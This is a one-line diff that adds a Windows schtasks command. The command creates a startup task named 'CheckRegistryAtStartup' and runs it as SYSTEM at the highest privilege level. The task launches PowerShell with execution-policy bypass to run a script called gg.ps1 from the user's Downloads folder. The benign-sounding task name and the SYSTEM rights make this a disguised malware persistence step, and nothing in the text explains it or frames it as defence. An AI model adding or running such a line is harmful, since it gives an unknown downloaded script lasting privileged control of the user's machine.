@@ -1,0 +1,1 @@
+schtasks /create /tn "CheckRegistryAtStartup" /tr "powershell -noExit -ep bypass -noP start-process powershell.exe -windowstyle maximize $env:userprofile\Downloads\gg.ps1" /sc onstart /ru SYSTEM /rl HIGHEST /f
